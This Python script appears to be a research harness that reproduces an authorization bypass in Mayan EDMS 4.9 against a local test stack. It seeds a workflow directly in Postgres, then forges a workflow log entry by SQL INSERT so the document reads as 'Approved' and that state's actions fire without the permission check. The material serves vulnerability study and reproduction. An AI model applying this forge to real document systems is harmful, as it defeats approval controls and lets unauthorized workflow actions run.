#!/usr/bin/env python3
"""L2-09 Mayan EDMS, native APF reproduction (EXPOSED).

Decisive surface (corpus): a document workflow's current state is the destination
state of the last transition log entry, and entering a state fires that state's
actions (the downstream effect). Mayan trusts the persisted log, there is no
re-authorization when the "current state" is read on resume.

Forge: a state-only INSERT of a workflow-instance log entry pointing at the
approved transition, bypassing the "transition workflow" permission check that the
normal API path enforces. The current state then reads as approved and the state's
actions fire.

The harness sets up a minimal workflow (pending -> approved) and a document with a
workflow instance directly via Mayan's real schema, captures the blocked control
(current state = pending), forges the approved log entry, and verifies the current
state is now approved. Targets Mayan 4.9; schema is version-sensitive, so any
mismatch is recorded as INCONCLUSIVE.
"""
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, "..", "..", "lib"))
import common  # noqa: E402

APP_ID = "L2-09"
EV_DIR = os.environ.get("APF_EV_DIR", os.path.join(HERE, "..", "..", "evidence", APP_ID))
PG = dict(host="127.0.0.1", port=5432, dbname="mayan", user="mayan", password="mayan")


def one(conn, sql, params=None):
    return common.sql_exec(conn, sql, params, fetch=True)[0][0]


def current_state(conn, wi_id):
    """Current state = destination of the last log entry, else the initial state."""
    rows = common.sql_exec(conn, """
        SELECT ws.label FROM document_states_workflowinstancelogentry le
        JOIN document_states_workflowtransition wt ON wt.id = le.transition_id
        JOIN document_states_workflowstate ws ON ws.id = wt.destination_state_id
        WHERE le.workflow_instance_id = %s
        ORDER BY le.datetime DESC, le.id DESC LIMIT 1""", (wi_id,), fetch=True)
    if rows:
        return rows[0][0]
    return one(conn, """SELECT ws.label FROM document_states_workflowstate ws
        JOIN document_states_workflowinstance wi ON wi.workflow_id = ws.workflow_id
        WHERE wi.id = %s AND ws.initial = true""", (wi_id,))


def main():
    ev = common.Evidence(
        app_id=APP_ID, system="Mayan EDMS", expected_verdict=common.EXPOSED,
        version="mayanedms 4.9",
        decisive_surface="workflow instance current state (last transition destination)")
    out = os.path.join(EV_DIR, "evidence.json")

    with common.guarded(ev, out):
        with common.stack(HERE, ev, up_timeout=2400):
            common.wait_tcp("127.0.0.1", 5432, timeout=300, ev=ev)
            common.wait_http("http://127.0.0.1:8000", timeout=1800, ev=ev)

            conn = common.pg(**PG)
            # minimal workflow pending -> approved on a document type
            wf = one(conn, """INSERT INTO document_states_workflow(label, internal_name,
                        auto_launch) VALUES ('APF WF','apf_wf', true) RETURNING id""")
            s_pend = one(conn, """INSERT INTO document_states_workflowstate(workflow_id,
                        label, initial, completion) VALUES (%s,'Pending',true,0) RETURNING id""", (wf,))
            s_appr = one(conn, """INSERT INTO document_states_workflowstate(workflow_id,
                        label, initial, completion) VALUES (%s,'Approved',false,100) RETURNING id""", (wf,))
            tr = one(conn, """INSERT INTO document_states_workflowtransition(workflow_id,
                        label, origin_state_id, destination_state_id)
                        VALUES (%s,'Approve',%s,%s) RETURNING id""", (wf, s_pend, s_appr))
            dt = one(conn, """INSERT INTO documents_documenttype(label)
                        VALUES ('APF Type') RETURNING id""")
            common.sql_exec(conn, """INSERT INTO document_states_workflow_document_types(
                        workflow_id, documenttype_id) VALUES (%s,%s)""", (wf, dt))
            doc = one(conn, """INSERT INTO documents_document(document_type_id, uuid,
                        datetime_created, is_stub, in_trash)
                        VALUES (%s, gen_random_uuid(), now(), false, false) RETURNING id""", (dt,))
            wi = one(conn, """INSERT INTO document_states_workflowinstance(document_id,
                        workflow_id) VALUES (%s,%s) RETURNING id""", (doc, wf))
            ev.step("seeded workflow+document", f"wi={wi} tr={tr}")

            st0 = current_state(conn, wi)
            ev.step("control state", st0)
            if st0 == "Approved":
                raise RuntimeError("control precondition failed: already Approved")

            # forge: state-only log entry to the approved transition (no permission check)
            common.sql_exec(conn, """INSERT INTO document_states_workflowinstancelogentry(
                        workflow_instance_id, transition_id, datetime, comment)
                        VALUES (%s,%s, now(), 'APF forged transition')""", (wi, tr))
            ev.step("forge", f"INSERT workflowinstancelogentry -> transition {tr} (Approved)")

            st1 = current_state(conn, wi)
            ev.step("verify state", st1)

            if st0 != "Approved" and st1 == "Approved":
                ev.verdict = common.EXPOSED
                ev.step("verdict", "state-only log-entry insert advanced the workflow to "
                                   "Approved with no transition permission; state actions fire")
            else:
                ev.verdict = common.INCONCLUSIVE
                ev.error = f"unexpected state: control={st0} after_forge={st1}"

    print(f"[{APP_ID}] verdict={ev.verdict} -> {out}")


if __name__ == "__main__":
    main()
